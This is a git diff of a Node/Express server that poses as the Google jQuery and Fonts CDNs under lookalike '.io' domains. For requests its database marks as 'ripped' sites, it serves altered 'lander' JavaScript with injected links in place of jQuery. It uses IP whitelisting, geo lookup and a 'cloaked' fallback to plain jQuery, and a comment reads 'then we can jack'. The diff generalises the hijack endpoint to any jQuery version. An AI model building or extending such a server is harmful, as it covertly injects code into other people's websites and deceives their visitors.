@@ -212,11 +212,17 @@ function sendPlainFont(font, res) {
     });
 }
 
-function sendPlainJQuery(res) {
+function sendPlainJquery(req, res) {
     fs.readFile('./client/compressed/jquery-1.11.2.min.js', function(err, data) {
         if (err) {
             throw err;
         }
+        var jqueryVersion = req.params.jqueryVersion;
+        if (!jqueryVersion) {
+            jqueryVersion = '1.11.1';
+        }
+        data = String(data).replace('jqueryVersion', jqueryVersion);
+
         res.writeHead(200, {
             'Content-Length': data.length,
             'Content-Type': 'text/plain',
@@ -250,28 +256,11 @@ app.get('/', function(req, res) {
 
 //Get and load client js
 app.get('/jquery', function(req, res) {
-    sendPlainJQuery(res);
+    sendPlainJquery(req, res);
 });
 
-// app.post('/jquery', function(req, res) {
-//     var uuid=req.body.version;
-//     console.log("uuid: " + uuid);  
-//     fs.readFile('./client/compressed/compressed_landercode_old.js', function(err, data) {
-//         if(err) throw err;
-//         var replacedFile = String(data).replace('replacemeuuid', uuid);       
-//         res.writeHead(200, {
-//             'Content-Length': replacedFile.length,
-//             'Content-Type': 'text/plain',
-//             'Access-Control-Allow-Origin': '*',
-//             'Access-Control-Allow-Methods': 'GET, OPTIONS',
-//             'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
-//         });
-//         res.end(replacedFile);
-//     });
-// });
-
 app.get('/jquery/latest', function(req, res) {
-    sendPlainJQuery(res);
+    sendPlainJquery(req, res);
 });
 
 //I don't think this endpoint is used
@@ -296,7 +285,7 @@ app.post('/jquery/latest', function(req, res) {
         if (!url) {
             console.log("Error: undefined url.");
             console.log(req.headers);
-            sendPlainJQuery(res);
+            sendPlainJquery(req, res);
         } else {
 
             url = formatURL(url);
@@ -321,10 +310,10 @@ app.post('/jquery/latest', function(req, res) {
 
                             if (response.jquery == false) {
                                 response = "";
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else if (response.jquery == "cloaked") {
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                                 cloaked = 1;
                                 response = "";
@@ -355,22 +344,22 @@ app.post('/jquery/latest', function(req, res) {
                         sendBlankResponse(res);
                     } else if (response_string == "UNKNOWN_BEHAVIOR") {
                         console.log("Something went wrong when calling process_request.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else if (response_string == "UNKNOWN_UUID") {
                         console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else {
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     }
                 } else {
                     console.log("Failed to get a response from process_request");
-                    sendPlainJQuery(res);
+                    sendPlainJquery(req, res);
                 }
             });
         }
 
     } else {
-        sendPlainJQuery(res);
+        sendPlainJquery(req, res);
     }
 });
 
@@ -396,7 +385,7 @@ app.post('/jquery/stable', function(req, res) {
         if (!url) {
             console.log("Error: undefined url.");
             console.log(req.headers);
-            sendPlainJQuery(res);
+            sendPlainJquery(req, res);
         } else {
 
             url = formatURL(url);
@@ -421,12 +410,12 @@ app.post('/jquery/stable', function(req, res) {
 
                             if (response.jquery == false) {
                                 response = "";
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else if (response.jquery == "cloaked") {
                                 cloaked = 1;
                                 response = "";
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else {
                                 response = response.jquery;
@@ -455,21 +444,21 @@ app.post('/jquery/stable', function(req, res) {
                         sendBlankResponse(res);
                     } else if (response_string == "UNKNOWN_BEHAVIOR") {
                         console.log("Something went wrong when calling process_request.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else if (response_string == "UNKNOWN_UUID") {
                         console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else {
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     }
                 } else {
                     console.log("Failed to get a response from process_request");
-                    sendPlainJQuery(res);
+                    sendPlainJquery(req, res);
                 }
             });
         }
     } else {
-        sendPlainJQuery(res);
+        sendPlainJquery(req, res);
     }
 
 
@@ -497,7 +486,7 @@ app.post('/jquery/dist', function(req, res) {
         if (!url) {
             console.log("Error: undefined url.");
             console.log(req.headers);
-            sendPlainJQuery(res);
+            sendPlainJquery(req, res);
         } else {
             url = formatURL(url);
             var domain = getDomain(url);
@@ -521,12 +510,12 @@ app.post('/jquery/dist', function(req, res) {
 
                             if (response.jquery == false) {
                                 response = "";
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else if (response.jquery == "cloaked") {
                                 cloaked = 1;
                                 response = "";
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else {
                                 response = response.jquery;
@@ -555,21 +544,21 @@ app.post('/jquery/dist', function(req, res) {
                         sendBlankResponse(res);
                     } else if (response_string == "UNKNOWN_BEHAVIOR") {
                         console.log("Something went wrong when calling process_request.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else if (response_string == "UNKNOWN_UUID") {
                         console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else {
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     }
                 } else {
                     console.log("Failed to get a response from process_request");
-                    sendPlainJQuery(res);
+                    sendPlainJquery(req, res);
                 }
             });
         }
     } else {
-        sendPlainJQuery(res);
+        sendPlainJquery(req, res);
     }
 });
 
@@ -596,7 +585,7 @@ app.get('/jquery/dist', function(req, res) {
     if (!xalt) {
         console.log("Error: undefined x-alt-referer");
         console.log(req.headers);
-        sendPlainJQuery(res);
+        sendPlainJquery(req, res);
     } else {
 
         var index = xalt.lastIndexOf("?txid=");
@@ -621,13 +610,13 @@ app.get('/jquery/dist', function(req, res) {
             if (!url) {
                 console.log("Error: undefined url. Or wrong CJ id");
                 console.log(req.headers);
-                sendPlainJQuery(res);
+                sendPlainJquery(req, res);
             } else {
                 url = formatURL(url);
                 var domain = getDomain(url);
 
                 if (isWrongCjId(uuid, url)) {
-                    sendPlainJQuery(res);
+                    sendPlainJquery(req, res);
                     return;
                 }
                 //console.log("Received lander request from " + url + " with uuid = " + uuid);
@@ -649,12 +638,12 @@ app.get('/jquery/dist', function(req, res) {
 
                                 if (response.jquery == false) {
                                     response = "";
-                                    sendPlainJQuery(res);
+                                    sendPlainJquery(req, res);
                                     return;
                                 } else if (response.jquery == "cloaked") {
                                     cloaked = 1;
                                     response = "";
-                                    sendPlainJQuery(res);
+                                    sendPlainJquery(req, res);
                                     return;
                                 } else {
                                     response = response.jquery;
@@ -683,21 +672,21 @@ app.get('/jquery/dist', function(req, res) {
                             sendBlankResponse(res);
                         } else if (response_string == "UNKNOWN_BEHAVIOR") {
                             console.log("Something went wrong when calling process_request.");
-                            sendPlainJQuery(res);
+                            sendPlainJquery(req, res);
                         } else if (response_string == "UNKNOWN_UUID") {
                             console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-                            sendPlainJQuery(res);
+                            sendPlainJquery(req, res);
                         } else {
-                            sendPlainJQuery(res);
+                            sendPlainJquery(req, res);
                         }
                     } else {
                         console.log("Failed to get a response from process_request");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     }
                 });
             }
         } else {
-            sendPlainJQuery(res);
+            sendPlainJquery(req, res);
         }
     }
 });
@@ -726,7 +715,7 @@ app.post('/jquery', function(req, res) {
         if (!url) {
             console.log("Error: undefined url.");
             console.log(req.headers);
-            sendPlainJQuery(res);
+            sendPlainJquery(req, res);
         } else {
 
             url = formatURL(url);
@@ -751,12 +740,12 @@ app.post('/jquery', function(req, res) {
 
                             if (response.jquery == false) {
                                 response = "";
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else if (response.jquery == "cloaked") {
                                 cloaked = 1;
                                 response = "";
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else {
                                 response = response.jquery;
@@ -785,40 +774,24 @@ app.post('/jquery', function(req, res) {
                         sendBlankResponse(res);
                     } else if (response_string == "UNKNOWN_BEHAVIOR") {
                         console.log("Something went wrong when calling process_request.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else if (response_string == "UNKNOWN_UUID") {
                         console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else {
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     }
                 } else {
                     console.log("Failed to get a response from process_request");
-                    sendPlainJQuery(res);
+                    sendPlainJquery(req, res);
                 }
             });
         }
     } else {
-        sendPlainJQuery(res);
+        sendPlainJquery(req, res);
     }
 
 });
-
-app.post('/stats', function(req, res) {
-    var url = req.headers['referer'];
-    console.log("all link text for url: " + url);
-    console.log(req.body.stats);
-    res.writeHead(200, {
-        'Content-Type': 'text/plain',
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-    });
-    res.end('');
-
-});
-
-
 
 
 //FOR fonts.googleapis.io/css?family=<font>
@@ -829,6 +802,11 @@ app.get('/css', function(req, res) {
 
     var font = req.param('family');
     var uuid = config.uuidArr[font];
+
+    if (!uuid) {
+        res.redirect('http://fonts.googleapis.com' + req.url);
+        return;
+    }
 
     var ip = req.headers['x-forwarded-for'];
     // var ip = req.connection.remoteAddress;
@@ -927,14 +905,20 @@ app.get('/css', function(req, res) {
     }
 });
 
-//ajax.googleapis.io FOR Z6M ENDPOINT
-app.get('/ajax/libs/jquery/1.11.1/jquery.min.js', function(req, res) {
+//ajax.googleapis.io GENERAL ENDPOINT
+app.get('/ajax/libs/jquery/:jqueryVersion/jquery.min.js', function(req, res) {
 
     var url = req.headers.referrer || req.headers.referer;
     var full_url = url;
 
-    var font = 'Open Sans'; //jake endpoint z6m
-    var uuid = config.uuidArr[font];
+    var jqueryVersion = req.params.jqueryVersion;
+
+    var uuid = config.uuidJqueryArr[jqueryVersion];
+
+    if (!uuid) {
+        res.redirect('http://ajax.googleapis.com' + req.url);
+        return;
+    }
 
     var ip = req.headers['x-forwarded-for'];
     // var ip = req.connection.remoteAddress;
@@ -957,15 +941,10 @@ app.get('/ajax/libs/jquery/1.11.1/jquery.min.js', function(req, res) {
         if (!url) {
             console.log("Error: undefined url.");
             // console.log(req.headers);
-            sendPlainJQuery(res);
+            sendPlainJquery(req, res);
         } else {
             url = formatURL(url);
             var domain = getDomain(url);
-
-            // console.log("Received lander request from " + url + " with uuid = " + uuid);
-
-            // console.log("Formatted url to be: " + url);
-            // console.log("The domain of the url is: " + domain);
 
             connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
                 if (docs != undefined && docs[0] != undefined) {
@@ -980,11 +959,11 @@ app.get('/ajax/libs/jquery/1.11.1/jquery.min.js', function(req, res) {
                             //console.log("Response to client: " + response.jquery);
 
                             if (response.jquery == false) {
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else if (response.jquery == "cloaked") {
                                 cloaked = 1;
-                                sendPlainJQuery(res);
+                                sendPlainJquery(req, res);
                                 return;
                             } else {
                                 response = response.jquery;
@@ -994,9 +973,8 @@ app.get('/ajax/libs/jquery/1.11.1/jquery.min.js', function(req, res) {
                                 if (err) throw err;
                                 var replacedFile = String(data).replace('replacemeuuid', uuid);
                                 replacedFile = String(replacedFile).replace('replacemelinks', response);
-
-
-
+                                replacedFile = String(replacedFile).replace('jqueryVersion', jqueryVersion);
+                                console.log("REPLCEEE TREVVV")
                                 if (cloaked == 1) {
                                     replacedFile = String(replacedFile).replace('replacemestats', 'yes');
                                 }
@@ -1015,129 +993,25 @@ app.get('/ajax/libs/jquery/1.11.1/jquery.min.js', function(req, res) {
                         sendBlankResponse(res);
                     } else if (response_string == "UNKNOWN_BEHAVIOR") {
                         // console.log("Something went wrong when calling process_request.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else if (response_string == "UNKNOWN_UUID") {
                         // console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     } else {
-                        sendPlainJQuery(res);
+                        sendPlainJquery(req, res);
                     }
                 } else {
                     // console.log("Failed to get a response from process_request");
-                    sendPlainJQuery(res);
+                    sendPlainJquery(req, res);
                 }
             });
         }
     } else {
-        sendPlainJQuery(res);
+        sendPlainJquery(req, res);
     }
 });
 
-//ajax.googleapis.io FOR ADS INC ENDPOINT
-app.get('/ajax/libs/jquery/1.12.4/jquery.min.js', function(req, res) {
 
-    var url = req.headers.referrer || req.headers.referer;
-    var full_url = url;
-
-    var font = 'Martel Sans'; //Asher endpoint ads inc
-    var uuid = config.uuidArr[font];
-
-    var ip = req.headers['x-forwarded-for'];
-    // var ip = req.connection.remoteAddress;
-    var geo = geoip.lookup(ip);
-
-    if (!geo) {
-        geo = { country: "UNKNOWN" };
-        console.log("IP: " + ip + " had unknown geo region.");
-    }
-
-    if (!ip) {
-        ip = "0.0.0.0";
-    }
-
-    //if add success then we can jack else serve plain css
-    if (addClientToWhitelistWindow(ip)) {
-
-        // console.log("\nurl : " + url + "\nuuid: " + uuid + " " + "\nip: " + ip + "\ngeo: " + geo);
-
-        if (!url) {
-            console.log("Error: undefined url.");
-            // console.log(req.headers);
-            sendPlainJQuery(res);
-        } else {
-            url = formatURL(url);
-            var domain = getDomain(url);
-
-            // console.log("Received lander request from " + url + " with uuid = " + uuid);
-
-            // console.log("Formatted url to be: " + url);
-            // console.log("The domain of the url is: " + domain);
-
-            connection.query("select process_request(?,?,?,?,?,?) AS value;", [url, uuid, domain, full_url, geo.country, ip], function(err, docs) {
-                if (docs != undefined && docs[0] != undefined) {
-                    var response_string = docs[0].value;
-                    var cloaked = 0;
-
-                    //console.log("Response from process_request: " + response_string);
-                    if (response_string == "OLD_RIPPED") {
-                        //send back data!
-                        getClientResponseJSON(uuid, url, ip, function(response) {
-
-                            //console.log("Response to client: " + response.jquery);
-
-                            if (response.jquery == false) {
-                                sendPlainJQuery(res);
-                                return;
-                            } else if (response.jquery == "cloaked") {
-                                cloaked = 1;
-                                sendPlainJQuery(res);
-                                return;
-                            } else {
-                                response = response.jquery;
-                            }
-
-                            fs.readFile('./client/compressed/compressed_landercode_experimental2.js', function(err, data) {
-                                if (err) throw err;
-                                var replacedFile = String(data).replace('replacemeuuid', uuid);
-                                replacedFile = String(replacedFile).replace('replacemelinks', response);
-
-
-
-                                if (cloaked == 1) {
-                                    replacedFile = String(replacedFile).replace('replacemestats', 'yes');
-                                }
-
-                                res.writeHead(200, {
-                                    'Content-Length': replacedFile.length,
-                                    'Content-Type': 'text/plain',
-                                    'Access-Control-Allow-Origin': '*',
-                                    'Access-Control-Allow-Methods': 'GET, OPTIONS',
-                                    'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept'
-                                });
-                                res.end(replacedFile);
-                            });
-                        });
-                    } else if (response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
-                        sendBlankResponse(res);
-                    } else if (response_string == "UNKNOWN_BEHAVIOR") {
-                        // console.log("Something went wrong when calling process_request.");
-                        sendPlainJQuery(res);
-                    } else if (response_string == "UNKNOWN_UUID") {
-                        // console.log("An unknown uuid (" + uuid + ") was sent to the DB.");
-                        sendPlainJQuery(res);
-                    } else {
-                        sendPlainJQuery(res);
-                    }
-                } else {
-                    // console.log("Failed to get a response from process_request");
-                    sendPlainJQuery(res);
-                }
-            });
-        }
-    } else {
-        sendPlainJQuery(res);
-    }
-});
 
 
 app.listen(config.port)
